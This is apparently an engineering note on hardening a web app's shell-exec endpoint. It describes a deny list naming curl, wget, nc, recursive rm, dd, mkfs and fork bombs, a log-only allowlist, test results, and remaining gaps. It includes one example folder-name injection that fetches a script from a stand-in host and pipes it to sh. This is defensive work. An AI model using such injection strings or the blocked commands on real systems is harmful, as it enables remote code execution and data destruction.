# shell/exec lockdown — 2026-09-08

## What shipped

`/api/shell/exec` in api.js (~line 721) had no validation. Any logged-in user
could run anything. This is the endpoint Kyle's `rm -rf` went through.

Two layers now, deliberately unequal in strength.

### DENY — enforced now, returns HTTP 403
Matches anywhere in the command, not just at the start, so
`mkdir -p /a && rm -rf /b` is caught:

- recursive rm (`-r`, `-R`, in any flag cluster)
- sudo
- curl / wget / nc / ncat
- chmod / chown / chflags
- dd / mkfs / diskutil / fdisk
- launchctl / systemctl / kextload
- shutdown / reboot / halt
- writes to /dev/disk or /dev/rdisk
- fork bomb
- killall -9 / pkill -9

### ALLOW — LOG-ONLY until proven against live intake
Writes `[security] shell/exec WOULD-REFUSE` to the server log and still runs
the command. Flip to refusing by adding to .env:

    SHELL_EXEC_ENFORCE_ALLOW=1

Permitted leading binaries:
`find test mkdir mv cp rmdir rm stat which bash perl python3 open echo`
plus ffmpeg/ffprobe at any absolute path (basename is matched, so
`/usr/local/bin/ffmpeg` resolves to `ffmpeg`).

`VAR=x cmd` deliberately does NOT pass the allowlist — env-prefixed commands
return null from _shellLeadBin.

Every allowed command is now logged at 200 chars with the username. Previously
it logged 50 chars and would THROW if cmd was undefined (`cmd.substring` on
undefined) — that is fixed too.

## Verification actually performed
Extracted all 15 distinct real command shapes from the 51 `shell.exec` call
sites in index.html and ran them through the guard, plus 12 attack shapes.
Zero false positives, zero misses, in BOTH log-only and enforce mode.

So the allowlist is already correct for everything intake does. Log-only is
caution about call sites I may have mis-read, not a known gap. One clean day
of real intake traffic with no WOULD-REFUSE lines is enough to flip it.

## What this does NOT fix — IMPORTANT
All 51 call sites interpolate folder paths into shell strings with no
escaping, and the legitimate commands themselves use `|`, `&&`, `;` and
redirects — so shell metacharacters CANNOT be blocked without breaking
intake. A folder named  x"; curl evil.sh | sh; #  can still inject.

The real fix is argv arrays at all 51 call sites in index.html. That is a
day of work and would break intake while in flight. Not attempted.

## Still open, same class
`/api/applescript` (api.js ~line 923) is the identical hole with a wider
blast radius — arbitrary AppleScript is broader than shell on macOS. It has
7 callers in index.html, all Daylite. Much tighter allowlist than the shell
one. This is the next security item.

## Call-site inventory (leading binary → count)
mkdir 12 | find 8 | test 5 | mv 4 | cp 3 | python3 3 | rmdir 2 | ffmpeg 2
ffprobe 1 | perl 1 | bash 1 | stat 1 | rm 1 | which 1 | open 2 | findAudio() 2
